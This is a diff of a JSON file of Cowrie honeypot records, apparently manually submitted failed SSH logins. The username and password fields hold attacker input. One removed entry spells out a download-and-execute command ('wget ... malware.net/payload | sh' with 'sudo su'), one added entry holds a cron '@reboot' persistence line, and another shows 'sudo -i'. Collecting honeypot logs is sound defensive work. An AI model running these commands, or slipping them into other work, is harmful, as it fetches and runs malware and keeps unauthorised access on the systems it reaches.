@@ -3,18 +3,6 @@
     {
       "log": {
         "eventid": "cowrie.login.failed",
-        "src_ip": "198.51.100.5",
-        "username": "\"wget",
-        "password": "-q -O - malware.net/payload | sh\"45.76.123.45 \"sudo su\"",
-        "timestamp": "2026-03-29T12:03:27.659603",
-        "submitted_at": "2026-03-29T12:03:27.659646",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T12:03:27.659646"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
         "src_ip": "45.76.123.45",
         "username": "\"sudo",
         "password": "-i\"",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T22:24:57.999001"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "185.199.108.153",
+        "username": "\"@reboot",
+        "password": "/root/persist.sh\"",
+        "timestamp": "2026-03-29T22:25:01.218823",
+        "submitted_at": "2026-03-29T22:25:01.218843",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T22:25:01.218843"
     }
   ]
 }
